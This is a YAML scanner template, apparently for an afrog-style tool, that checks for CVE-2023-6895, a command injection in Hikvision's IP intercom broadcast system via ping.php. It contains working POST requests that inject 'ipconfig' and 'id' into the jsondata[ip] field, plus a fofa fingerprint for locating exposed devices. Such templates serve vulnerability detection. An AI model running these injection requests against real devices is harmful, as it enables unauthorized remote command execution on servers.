id: CVE-2023-6895

info:
  name: 海康威视IP网络对讲广播系统 ping.php 命令执行
  author: zan8in
  severity: critical
  verified: true
  descritpion: |-
    海康威视存在RCE漏洞，该漏洞源于文件/php/ping.php的参数jsondata[ip]会导致操作系统命令注入，执行任意命令，通过该漏洞可以获取服务器权限。
    fofa: icon_hash="-1830859634"
  reference:
    - https://mp.weixin.qq.com/s/SuFQRTAMg4OXrkEeXHtrSA
    - https://nvd.nist.gov/vuln/detail/CVE-2023-6895
  tags: cve,cve2023,hikvision,rce
  created: 2024/01/03

rules:
  r0:
    request:
      method: POST
      path: /php/ping.php
      body: jsondata%5Btype%5D=99&jsondata%5Bip%5D=ipconfig
    expression: response.body.bcontains(b'Windows IP')
  r1:
    request:
      method: POST
      path: /php/ping.php
      body: jsondata%5Btype%5D=99&jsondata%5Bip%5D=id
    expression: |
      "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
expression: r0() || r1()
